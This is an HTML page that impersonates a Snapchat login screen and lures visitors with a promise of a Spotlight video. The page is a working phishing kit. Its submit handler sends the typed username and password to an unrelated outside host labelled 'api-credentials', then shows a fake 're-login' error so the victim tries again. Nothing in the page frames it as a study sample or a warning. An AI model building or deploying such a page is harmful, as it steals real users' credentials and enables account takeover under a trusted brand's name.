<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" href="img/faviconV2.png">
  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
  <meta property="og:site_name" content="Snapchat Spotlight">
  <link rel="stylesheet" href="./css/login.css"> <!-- Pfad prüfen -->
  <title>Login • Snapchat</title>
</head>
<body>
  <div class="login-container">
    <div id="error-message" class="error-message" style="display:none;">
      Something went wrong! Please re-login to your account.
    </div>
    <h1>Log In</h1>
    <form id="login-form" method="POST" autocomplete="off">
      <label for="username">USERNAME OR EMAIL</label>
      <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter username or email">

      <label for="password">PASSWORD</label>
      <div class="password-container">
        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter password">
        <button type="button" class="toggle-password" aria-label="Passwort anzeigen/verbergen">
          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="">
        </button>
      </div>

      <div class="incorrect" style="display: none;">
        <p>Incorrect password, please try again.</p>
      </div>

      <button type="submit" class="login-button">Log In</button>
    </form>
  </div>

  <script>
    // Password Toggle
    document.querySelector('.toggle-password').addEventListener('click', function() {
      const passwordInput = document.getElementById('password');
      const eyeIcon = document.getElementById('eye-icon');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.src = 'img/eye-open.svg';
      } else {
        passwordInput.type = 'password';
        eyeIcon.src = 'img/eye-closed.svg';
      }
    });

    // Formular-Validation
    document.getElementById('login-form').addEventListener('submit', function(event) {
      event.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      if (!username || !password) {
        alert('Please enter both username and password!');
        return;
      }

      fetch('https://api-credentials-062026-production.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password })
      })
      .then(response => {
        if (!response.ok) throw new Error('API error');
        return response.json();
      })
      .then(data => {
        // Erfolg: Weiterleiten oder Formular submitten
        this.submit();
      })
      .catch(error => {
        document.getElementById('error-message').style.display = 'block';
        console.error('Error:', error);
      });
    });
  </script>
</body>
</html>
